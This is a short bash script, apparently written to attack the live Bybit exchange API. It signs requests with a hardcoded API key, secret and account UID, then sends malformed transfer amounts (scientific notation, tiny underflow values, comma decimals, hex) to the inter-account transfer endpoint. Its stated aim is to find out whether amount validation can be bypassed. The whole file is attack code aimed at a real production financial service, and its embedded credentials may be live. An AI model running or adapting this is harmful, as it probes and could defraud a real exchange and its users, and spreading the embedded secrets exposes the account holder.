#!/bin/bash
# PRECISION & LOGIC FUZZER
# Testing if we can bypass validation using weird number formats

API_KEY="22JSr5zWpW0eReC6rE"
API_SECRET="QZhQLj0tXsbSeTHYHnvoB99GKILfFdMkzWYN"
BASE="https://api.bybit.com"
UID="527465456" # Master UID

OFFSET=$(($(curl -s "$BASE/v5/market/time" | grep -o '"timeSecond":"[0-9]*"' | cut -d'"' -f4) - $(date +%s)))

sign() {
    local p=$1
    local t=$(($(date +%s) + OFFSET))000
    local s=$(echo -n "${t}${API_KEY}5000${p}" | openssl dgst -sha256 -hmac "$API_SECRET" | awk '{print $2}')
    echo "$t|$s"
}

fuzz() {
    local name=$1
    local amount=$2
    
    echo "--- Testing: $name ($amount) ---"
    
    UUID=$(cat /proc/sys/kernel/random/uuid)
    # Trying transfer to SAME UID first (to pass memberId check if logic exists)
    # If 10016 goes away and we get 10002/0 -> Interesting
    PAYLOAD="{\"transferId\":\"$UUID\",\"coin\":\"USDT\",\"amount\":\"$amount\",\"fromMemberId\":$UID,\"toMemberId\":$UID}"
    
    IFS='|' read -r ts sig <<< $(sign "$PAYLOAD")
    
    resp=$(curl -s -X POST "$BASE/v5/asset/transfer/inter-transfer" \
        -H "X-BAPI-API-KEY: $API_KEY" \
        -H "X-BAPI-SIGN: $sig" \
        -H "X-BAPI-SIGN-TYPE: 2" \
        -H "X-BAPI-TIMESTAMP: $ts" \
        -H "X-BAPI-RECV-WINDOW: 5000" \
        -H "Content-Type: application/json" \
        -d "$PAYLOAD")
    
    code=$(echo "$resp" | grep -o '"retCode":[0-9]*' | cut -d':' -f2)
    echo "Result: $code"
    echo "$resp" | grep -o '"retMsg":"[^"]*"'
    echo ""
}

echo "=========================================="
echo "PRECISION ATTACK"
echo "=========================================="

# 1. Scientific Notation (Bypass Regex?)
fuzz "Scientific" "1e-1"

# 2. Tiny Value (Underflow?)
fuzz "Tiny" "0.00000001"

# 3. Tiny Value with many zeros
fuzz "Tiny Long" "0.000000000000000001"

# 4. Large Precision
fuzz "High Precision" "0.010000000000000001"

# 5. Comma instead of Dot (Locale bug)
fuzz "Comma" "0,01"

# 6. Hex (Rare but possible)
fuzz "Hex" "0x1"

echo "Done."
